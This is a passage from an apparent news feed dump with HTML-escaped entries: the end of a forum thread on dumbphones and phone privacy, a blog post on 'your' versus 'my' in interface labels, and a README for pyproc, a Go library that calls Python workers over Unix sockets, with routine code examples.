                &lt;p&gt;Yep, I tried going the dumbphone route and lasted about a month. I travel a fair bit for work, and it’s almost impossible now without a smartphone.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;that’s the hard part for me. daily life is bearable with a dumb phone but i live in a semi-rural area. when i go to civilization it’s high friction without a smartphone.&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I get by alright without a smart phone. Over the years I’ve seen more and more “just scan this QR code to do such-and-such”, and I ignore them. I think you’re right that it is a lot of added friction compared to using a phone. A lot of stuff is instantly at your fingertips with your phone.&lt;/p&gt;
                &lt;p&gt;But to be honest, I really truly think that a bit of friction is a good thing. Without it, we just slide helplessly into oblivion. Or, less metaphorically speaking, the friction turns an automatic decision into a deliberate one. The friction pushes people to think about their actions and choices a little bit. And that’s generally a good thing - even if its a little bit harder.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;for me it was less about things being a little bit harder and more about being unable to travel from the airport to lodging or work offices without paying out of my own pocket, which I couldn’t afford anyhow.&lt;/p&gt;
                    &lt;p&gt;typically I would just buy a cheap prepaid stock android phone for this and use as much fake info as I could.&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;no malicious firmware that has spyware built in.&lt;/p&gt;
            &lt;p&gt;Sure about that?&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;spyware in a 90s phone ? Where it was even a miracle to be able to connect to Internet ? Yeah, they were able to pinpoint your position using the cell towers (which were less than today so not that precise) and the telecom know who and when you were calling but other than that…&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;Trust devices that are open and run open firmwares not old devices&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;True but I was only pointing out that what is a problem in modern smartphone was not a problem in older dumb phone since they lack the functionalities (and the supporting infrastructure)&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;You are assuming it wasn’t a problem back then&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;&lt;p&gt;It is a little difficult to spy on phone owner (except knowing where the phone is located) when everything you have is SMS and a memory measured in Kb, leaving aside that every phone had its own firmware incompatible with everyone else.&lt;/p&gt;&lt;lb/&gt;Of course telecom companies always know where you were and who you call, like today, but at most they can tap and read the SMS.&lt;p&gt;For context, GPRS was rolled out around 2001, before that you basically have not any data connection if not plugging to the phone an external modem.&lt;/p&gt;&lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;That’s just all electronics outside of Linux at this point.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;My next phone will be a ThinkPad because it has a SIM card slot.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Check out postmarketOS, a real Linux distro for phones with a 10-year life cycle goal and mainline kernel support. It’s not daily-driver ready for everyone, but it frees you from Google and OEM lockdowns. If we want an open mobile future, this is the project worth supporting.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;deleted by creator&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;I went with a Sonim XP3Plus flip phone&lt;/p&gt;
            &lt;p&gt;This is how I solved the modern tech problem.&lt;/p&gt;
            &lt;p&gt;You didn’t solve any problems, you just opted out of a whole bunch of features.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;deleted by creator&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;I did solve the problem; by choosing not to bother with it&lt;/p&gt;
                    &lt;p&gt;Walking away does not solve the problem. It just makes it no longer your problem. Everyone else still has to deal with it. Not everyone has that privilege.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;If we all stopped the world would adapt. The council let the street signs rot because everyone is on gmaps, restaurants stopped having menus just qr codes, places in England were you get kicked out if you insist to pay by cash.&lt;/p&gt;
                        &lt;p&gt;All of it would be reversed if… we reversed A pipe dream but weirder things happened&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;If we all stopped&lt;/p&gt;
                            &lt;p&gt;Okay well let me know when you get everyone to stop. Until then…&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;deleted by creator&lt;/p&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                          &lt;item&gt;
                            &lt;p&gt;deleted by creator&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;They did reverse the cash ting at the pub, every day a different customer would have a proper argument about it. Don’t ask why I was there everyday tho&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;It’s a pub. I think there should be no questions 🤣&lt;/p&gt;
                                  &lt;/item&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;deleted by creator&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                      &lt;item&gt;
                        &lt;p&gt;deleted by creator&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;Yes and no. Some of us actually need our phones to accomplish things. Work, primarily. As people mentioned elsewhere, simple things like accessing their banking accounts. I wish we didn’t, but we do.&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;deleted by creator&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;I’d never do banking on a smartphone; not in a million years.&lt;/p&gt;
                                    &lt;p&gt;They’re not doing it by choice. The phone is used as mandatory authentication to access the account.&lt;/p&gt;
                                    &lt;p&gt;One theft or hack in public, and all your money and data are at risk&lt;/p&gt;
                                    &lt;p&gt;…and how do you suppose your laptop is immune from this? Or your desktop, even?&lt;/p&gt;
                                    &lt;p&gt;that’s the aspect you want to keep avoiding.&lt;/p&gt;
                                    &lt;p&gt;I’m not avoiding anything. What you fail to understand is that not everyone’s situation is the same as yours. For some of us, these things are outside of our control.&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;He did solve a problem, his problem. What’s the deal with thinking everything that applies to you applies to others?&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;No problems were solved.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;That’s your best answer? “No problems we’re solved because I said so”? 🤣🤣🤣&lt;/p&gt;
                        &lt;p&gt;No wonder you sound so angry here, lol.&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;No problems were solved because they weren’t solved. I know that may be hard for you to wrap your head around.&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;It is, very.&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;deleted by creator&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;😬 I’m writing this on my pixel 3… What happened??&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;My wife’s pixel 3 just busted without any warning a few years ago. PLEASE be sure to have backups of your things and passwords. At the time they didn’t remember their password and was only logged in on their phone. We were able to recover through my email but it wasn’t a recovery address so it was really scary.&lt;/p&gt;
                &lt;p&gt;The worst part is we already had a family password manager they weren’t using, so it was very difficult to not make it seem like an “I told you so” moment, but they’re on it now and have backups and stuff.&lt;/p&gt;
                &lt;p&gt;But yeah. We took it to some phone repair guy and he tried a bunch of different stuff. The motherboard just failed or something. No way to extract anything. He said it happened a lot with that model (well, he’s only seeing the bad ones but still).&lt;/p&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;deleted by creator&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;2 weeks? That’s awesome. SM6115 and 2300mAh. My Lenovo P11 with LineageOS(GSI) also has a SM6115 with much bigger battery and only gives about 4 days idle… Are you using some technique for longer battery time?&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;deleted by creator&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;Cool, not sure why it doesn’t work for me :/ I only turn on wifi about once a week to sync new books from my server since I use it as an offline ebook reader.&lt;/p&gt;
                    &lt;p&gt;Haven’t had a pixel 3, but do have a pixel 2. Running stock rom because verizon and degoogled with adb and wifi off, only used for occasional quick photo shoots. The battery also only goes for about 3 days.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;deleted by creator&lt;/p&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Framework has the chance to do something really funny…&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Would love to see it but that sounds significantly more difficult.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;I wonder what a SIM modem expansion card would look like&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;I’ve seen them before but so far none first-party.&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Yeah I wish Framework, Tuxedo or Stillbook produced a Linux phone🤞&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;They’d have a better chance banding together with other companies and communities and pool resources into one device/os combo.&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://feddit.org/post/18353777"/><published>2025-09-16T00:33:12+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45257627</id><title>"Your" vs. "My" in user interfaces</title><updated>2025-09-16T13:01:41.703978+00:00</updated><content>&lt;doc fingerprint="ed26d1ac0dd0095d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;“Your” vs “My” in user interfaces&lt;/head&gt;
    &lt;p&gt;When referring to the user’s stuff, which is better out of these:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;“My account” or “Your account”?&lt;/item&gt;
      &lt;item&gt;“My orders” or “Your orders”?&lt;/item&gt;
      &lt;item&gt;“My cases” or “Your cases”?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It’s a trick question because often you don’t need any prefix and can just use:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Account&lt;/item&gt;
      &lt;item&gt;Orders&lt;/item&gt;
      &lt;item&gt;Cases&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Amazon is a good example of this in action because it’s obvious that it’s your account and your orders:&lt;/p&gt;
    &lt;p&gt;But what if your product contains things that belong to you and to others – for example, a case working system that contains your cases and everyone else‘s?&lt;/p&gt;
    &lt;head rend="h2"&gt;The problem with “my”&lt;/head&gt;
    &lt;p&gt;You could use “My cases” in a navigation menu like this:&lt;/p&gt;
    &lt;p&gt;This seems fine on the face of it.&lt;/p&gt;
    &lt;p&gt;But screens are not only accessed or referred to through a menu.&lt;/p&gt;
    &lt;p&gt;For example, you might need to sign post users to their cases in an onboarding flow, email notification or help article.&lt;/p&gt;
    &lt;p&gt;Saying something like “Go to my cases” is awkward and unnatural – if I told you to go to my cases, you’d think I was telling you to go to my cases, not yours.&lt;/p&gt;
    &lt;p&gt;Similarly, a support agent might tell you to “Go to your cases” over webchat or a phone call. This is confusing if the UI says “My cases”.&lt;/p&gt;
    &lt;p&gt;These issues just don’t come up when you use “your” – I’ve used this approach in multiple products over the years, and seen exactly zero issues in user research.&lt;/p&gt;
    &lt;p&gt;So that’s good.&lt;/p&gt;
    &lt;head rend="h2"&gt;“But what if the user is communicating to us using radio buttons, for example?”&lt;/head&gt;
    &lt;p&gt;This is easy if we look at an example:&lt;/p&gt;
    &lt;p&gt;This doesn’t make sense because it sounds like you’re instructing the computer to share their profile, not yours.&lt;/p&gt;
    &lt;p&gt;But it’s clear if you use “my”:&lt;/p&gt;
    &lt;p&gt;In summary:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use “your” when communicating to the user&lt;/item&gt;
      &lt;item&gt;Use “my” when the user is communicating to us&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you’d like to design forms that nail basic details like this, as well as complex problems found in enterprise systems, you might like my course, Form Design Mastery:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://adamsilver.io/blog/your-vs-my-in-user-interfaces/"/><published>2025-09-16T03:05:53+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45257929</id><title>Show HN: Pyproc – Call Python from Go Without CGO or Microservices</title><updated>2025-09-16T13:01:41.073975+00:00</updated><content>&lt;doc fingerprint="4b90731fa04f0c2"&gt;
  &lt;main&gt;
    &lt;p&gt;Run Python like a local function from Go — no CGO, no microservices.&lt;/p&gt;
    &lt;p&gt;Go excels at building high-performance web services, but sometimes you need Python:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Machine Learning Models: Your models are trained in PyTorch/TensorFlow&lt;/item&gt;
      &lt;item&gt;Data Science Libraries: You need pandas, numpy, scikit-learn&lt;/item&gt;
      &lt;item&gt;Legacy Code: Existing Python code that's too costly to rewrite&lt;/item&gt;
      &lt;item&gt;Python-Only Libraries: Some libraries only exist in Python ecosystem&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Traditional solutions all have major drawbacks:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Solution&lt;/cell&gt;
        &lt;cell role="head"&gt;Problems&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;CGO + Python C API&lt;/cell&gt;
        &lt;cell&gt;Complex setup, crashes can take down entire Go service, GIL still limits performance&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;REST/gRPC Microservice&lt;/cell&gt;
        &lt;cell&gt;Network latency, deployment complexity, service discovery, more infrastructure&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Shell exec&lt;/cell&gt;
        &lt;cell&gt;High startup cost (100ms+), no connection pooling, process management nightmare&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Embedded Python&lt;/cell&gt;
        &lt;cell&gt;GIL bottleneck, memory leaks, difficult debugging&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;pyproc lets you call Python functions from Go as if they were local functions, with:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Zero network overhead - Uses Unix Domain Sockets for IPC&lt;/item&gt;
      &lt;item&gt;Process isolation - Python crashes don't affect your Go service&lt;/item&gt;
      &lt;item&gt;True parallelism - Multiple Python processes bypass the GIL&lt;/item&gt;
      &lt;item&gt;Simple deployment - Just your Go binary + Python scripts&lt;/item&gt;
      &lt;item&gt;Connection pooling - Reuse connections for high throughput&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Perfect for teams who need to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Integrate existing Python ML models (PyTorch, TensorFlow, scikit-learn) into Go services&lt;/item&gt;
      &lt;item&gt;Process data with Python libraries (pandas, numpy) from Go applications&lt;/item&gt;
      &lt;item&gt;Handle 1-5k RPS with JSON payloads under 100KB&lt;/item&gt;
      &lt;item&gt;Deploy on the same host/pod without network complexity&lt;/item&gt;
      &lt;item&gt;Migrate gradually from Python microservices to Go while preserving Python logic&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ideal deployment scenarios:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Kubernetes same-pod deployments with shared volume for UDS&lt;/item&gt;
      &lt;item&gt;Docker containers with shared socket volumes&lt;/item&gt;
      &lt;item&gt;Traditional server deployments on Linux/macOS&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;pyproc is NOT designed for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cross-host communication - Use gRPC/REST APIs for distributed systems&lt;/item&gt;
      &lt;item&gt;Windows UDS support - Windows named pipes are not supported&lt;/item&gt;
      &lt;item&gt;GPU management - Use dedicated ML serving frameworks (TensorRT, Triton)&lt;/item&gt;
      &lt;item&gt;Large-scale ML serving - Consider Ray Serve, MLflow, or KServe for enterprise ML&lt;/item&gt;
      &lt;item&gt;Real-time streaming - Use Apache Kafka or similar for high-throughput streams&lt;/item&gt;
      &lt;item&gt;Database operations - Use native Go database drivers directly&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Component&lt;/cell&gt;
        &lt;cell role="head"&gt;Requirements&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Operating System&lt;/cell&gt;
        &lt;cell&gt;Linux, macOS (Unix Domain Sockets required)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Go Version&lt;/cell&gt;
        &lt;cell&gt;1.22+&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Python Version&lt;/cell&gt;
        &lt;cell&gt;3.9+ (3.12 recommended)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Deployment&lt;/cell&gt;
        &lt;cell&gt;Same host/pod only&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Container Runtime&lt;/cell&gt;
        &lt;cell&gt;Docker, containerd, any OCI-compatible&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Orchestration&lt;/cell&gt;
        &lt;cell&gt;Kubernetes (same-pod), Docker Compose, systemd&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Architecture&lt;/cell&gt;
        &lt;cell&gt;amd64, arm64&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No CGO Required - Pure Go implementation using Unix Domain Sockets&lt;/item&gt;
      &lt;item&gt;Bypass Python GIL - Run multiple Python processes in parallel&lt;/item&gt;
      &lt;item&gt;Function-like API - Call Python functions as easily as &lt;code&gt;pool.Call(ctx, "predict", input, &amp;amp;output)&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Minimal Overhead - 45μs p50 latency, 200,000+ req/s with 8 workers&lt;/item&gt;
      &lt;item&gt;Production Ready - Health checks, graceful shutdown, automatic restarts&lt;/item&gt;
      &lt;item&gt;Easy Deployment - Single binary + Python scripts, no service mesh needed&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Go side:&lt;/p&gt;
    &lt;code&gt;go get github.com/YuminosukeSato/pyproc@latest&lt;/code&gt;
    &lt;p&gt;Python side:&lt;/p&gt;
    &lt;code&gt;pip install pyproc-worker&lt;/code&gt;
    &lt;code&gt;# worker.py
from pyproc_worker import expose, run_worker

@expose
def predict(req):
    """Your ML model or Python logic here"""
    return {"result": req["value"] * 2}

if __name__ == "__main__":
    run_worker()&lt;/code&gt;
    &lt;code&gt;package main

import (
    "context"
    "fmt"
    "log"
    "github.com/YuminosukeSato/pyproc/pkg/pyproc"
)

func main() {
    // Create a pool of Python workers
    pool, err := pyproc.NewPool(pyproc.PoolOptions{
        Config: pyproc.PoolConfig{
            Workers:     4,  // Run 4 Python processes
            MaxInFlight: 10, // Max concurrent requests per worker
        },
        WorkerConfig: pyproc.WorkerConfig{
            SocketPath:   "/tmp/pyproc.sock",
            PythonExec:   "python3",
            WorkerScript: "worker.py",
        },
    }, nil)
    if err != nil {
        log.Fatal(err)
    }
    
    // Start all workers
    ctx := context.Background()
    if err := pool.Start(ctx); err != nil {
        log.Fatal(err)
    }
    defer pool.Shutdown(ctx)
    
    // Call Python function (automatically load-balanced)
    input := map[string]interface{}{"value": 42}
    var output map[string]interface{}
    
    if err := pool.Call(ctx, "predict", input, &amp;amp;output); err != nil {
        log.Fatal(err)
    }
    
    fmt.Printf("Result: %v\n", output["result"]) // Result: 84
}&lt;/code&gt;
    &lt;code&gt;go run main.go&lt;/code&gt;
    &lt;p&gt;That's it! You're now calling Python from Go without CGO or microservices.&lt;/p&gt;
    &lt;p&gt;If you cloned this repository, you can run a working end to end example without installing a Python package by using the bundled worker module.&lt;/p&gt;
    &lt;code&gt;make demo&lt;/code&gt;
    &lt;p&gt;This starts a Python worker from examples/basic/worker.py and calls it from Go. The example adjusts PYTHONPATH to import the local worker/python/pyproc_worker package.&lt;/p&gt;
    &lt;code&gt;go get github.com/YuminosukeSato/pyproc@latest&lt;/code&gt;
    &lt;code&gt;# Install from PyPI
pip install pyproc-worker

# Or install from source
cd worker/python
pip install -e .&lt;/code&gt;
    &lt;code&gt;cfg := pyproc.WorkerConfig{
    ID:           "worker-1",
    SocketPath:   "/tmp/pyproc.sock",
    PythonExec:   "python3",           // or path to virtual env
    WorkerScript: "path/to/worker.py",
    StartTimeout: 30 * time.Second,
    Env: map[string]string{
        "PYTHONUNBUFFERED": "1",
        "MODEL_PATH": "/models/latest",
    },
}&lt;/code&gt;
    &lt;code&gt;poolCfg := pyproc.PoolConfig{
    Workers:        4,                    // Number of Python processes
    MaxInFlight:    10,                   // Max concurrent requests per worker
    HealthInterval: 30 * time.Second,     // Health check frequency
}&lt;/code&gt;
    &lt;code&gt;from pyproc_worker import expose, run_worker

@expose
def add(req):
    """Simple addition function"""
    return {"result": req["a"] + req["b"]}

@expose
def multiply(req):
    """Simple multiplication"""
    return {"result": req["x"] * req["y"]}

if __name__ == "__main__":
    run_worker()&lt;/code&gt;
    &lt;code&gt;import pickle
from pyproc_worker import expose, run_worker

# Load model once at startup
with open("model.pkl", "rb") as f:
    model = pickle.load(f)

@expose
def predict(req):
    """Run inference on the model"""
    features = req["features"]
    prediction = model.predict([features])[0]
    confidence = model.predict_proba([features])[0].max()
    
    return {
        "prediction": int(prediction),
        "confidence": float(confidence)
    }

@expose
def batch_predict(req):
    """Batch prediction for efficiency"""
    features_list = req["batch"]
    predictions = model.predict(features_list)
    
    return {
        "predictions": predictions.tolist()
    }

if __name__ == "__main__":
    run_worker()&lt;/code&gt;
    &lt;code&gt;import pandas as pd
from pyproc_worker import expose, run_worker

@expose
def analyze_csv(req):
    """Analyze CSV data using pandas"""
    df = pd.DataFrame(req["data"])
    
    return {
        "mean": df.mean().to_dict(),
        "std": df.std().to_dict(),
        "correlation": df.corr().to_dict(),
        "summary": df.describe().to_dict()
    }

@expose
def aggregate_timeseries(req):
    """Aggregate time series data"""
    df = pd.DataFrame(req["data"])
    df['timestamp'] = pd.to_datetime(df['timestamp'])
    df.set_index('timestamp', inplace=True)
    
    # Resample to hourly
    hourly = df.resample('H').agg({
        'value': ['mean', 'max', 'min'],
        'count': 'sum'
    })
    
    return hourly.to_dict()

if __name__ == "__main__":
    run_worker()&lt;/code&gt;
    &lt;code&gt;func callPythonFunction(pool *pyproc.Pool) error {
    input := map[string]interface{}{
        "a": 10,
        "b": 20,
    }
    
    var output map[string]interface{}
    if err := pool.Call(context.Background(), "add", input, &amp;amp;output); err != nil {
        return fmt.Errorf("failed to call Python: %w", err)
    }
    
    fmt.Printf("Result: %v\n", output["result"])
    return nil
}&lt;/code&gt;
    &lt;code&gt;func callWithTimeout(pool *pyproc.Pool) error {
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    
    input := map[string]interface{}{"value": 42}
    var output map[string]interface{}
    
    if err := pool.Call(ctx, "slow_process", input, &amp;amp;output); err != nil {
        if err == context.DeadlineExceeded {
            return fmt.Errorf("Python function timed out")
        }
        return err
    }
    
    return nil
}&lt;/code&gt;
    &lt;code&gt;func processBatch(pool *pyproc.Pool, items []Item) ([]Result, error) {
    input := map[string]interface{}{
        "batch": items,
    }
    
    var output struct {
        Predictions []float64 `json:"predictions"`
    }
    
    if err := pool.Call(context.Background(), "batch_predict", input, &amp;amp;output); err != nil {
        return nil, err
    }
    
    results := make([]Result, len(output.Predictions))
    for i, pred := range output.Predictions {
        results[i] = Result{Value: pred}
    }
    
    return results, nil
}&lt;/code&gt;
    &lt;code&gt;func robustCall(pool *pyproc.Pool) {
    for retries := 0; retries &amp;lt; 3; retries++ {
        var output map[string]interface{}
        err := pool.Call(context.Background(), "predict", input, &amp;amp;output)
        
        if err == nil {
            // Success
            return
        }
        
        // Check if it's a Python error
        if strings.Contains(err.Error(), "ValueError") {
            // Invalid input, don't retry
            log.Printf("Invalid input: %v", err)
            return
        }
        
        // Transient error, retry with backoff
        time.Sleep(time.Duration(retries+1) * time.Second)
    }
}&lt;/code&gt;
    &lt;code&gt;FROM golang:1.21 AS builder
WORKDIR /app
COPY . .
RUN go build -o myapp .

FROM python:3.11-slim
RUN pip install pyproc-worker numpy pandas scikit-learn
COPY --from=builder /app/myapp /app/myapp
COPY worker.py /app/
WORKDIR /app
CMD ["./myapp"]&lt;/code&gt;
    &lt;code&gt;apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        env:
        - name: PYPROC_POOL_WORKERS
          value: "4"
        - name: PYPROC_SOCKET_DIR
          value: "/var/run/pyproc"
        volumeMounts:
        - name: sockets
          mountPath: /var/run/pyproc
      volumes:
      - name: sockets
        emptyDir: {}&lt;/code&gt;
    &lt;code&gt;logger := pyproc.NewLogger(pyproc.LoggingConfig{
    Level: "debug",
    Format: "json",
})

pool, _ := pyproc.NewPool(opts, logger)&lt;/code&gt;
    &lt;code&gt;health := pool.Health()
fmt.Printf("Workers: %d healthy, %d total\n", 
    health.HealthyWorkers, health.TotalWorkers)&lt;/code&gt;
    &lt;code&gt;// Expose Prometheus metrics
http.Handle("/metrics", promhttp.Handler())
http.ListenAndServe(":9090", nil)&lt;/code&gt;
    &lt;code&gt;# Check Python dependencies
python3 -c "from pyproc_worker import run_worker"

# Check socket permissions
ls -la /tmp/pyproc.sock

# Enable debug logging
export PYPROC_LOG_LEVEL=debug&lt;/code&gt;
    &lt;code&gt;// Increase worker count
poolCfg.Workers = runtime.NumCPU() * 2

// Pre-warm connections
pool.Start(ctx)
time.Sleep(1 * time.Second) // Let workers stabilize&lt;/code&gt;
    &lt;code&gt;# Add memory profiling to worker
import tracemalloc
tracemalloc.start()

@expose
def get_memory_usage(req):
    current, peak = tracemalloc.get_traced_memory()
    return {
        "current_mb": current / 1024 / 1024,
        "peak_mb": peak / 1024 / 1024
    }&lt;/code&gt;
    &lt;code&gt;@expose
def predict(req):
    model = load_model()  # Cached after first load
    features = req["features"]
    return {"prediction": model.predict(features)}&lt;/code&gt;
    &lt;code&gt;@expose
def process_dataframe(req):
    import pandas as pd
    df = pd.DataFrame(req["data"])
    result = df.groupby("category").sum()
    return result.to_dict()&lt;/code&gt;
    &lt;code&gt;@expose
def extract_pdf_text(req):
    import PyPDF2
    # Process PDF and return text
    return {"text": extracted_text}&lt;/code&gt;
    &lt;code&gt;┌─────────────┐           UDS            ┌──────────────┐
│   Go App    │ ◄──────────────────────► │ Python Worker│
│             │    Low-latency IPC        │              │
│  - HTTP API │                           │  - Models    │
│  - Business │                           │  - Libraries │
│  - Logic    │                           │  - Data Proc │
└─────────────┘                           └──────────────┘
     ▲                                           ▲
     │                                           │
     └──────────── Same Host/Pod ────────────────┘
&lt;/code&gt;
    &lt;p&gt;Run benchmarks locally:&lt;/p&gt;
    &lt;code&gt;# Quick benchmark
make bench

# Full benchmark suite with memory profiling
make bench-full&lt;/code&gt;
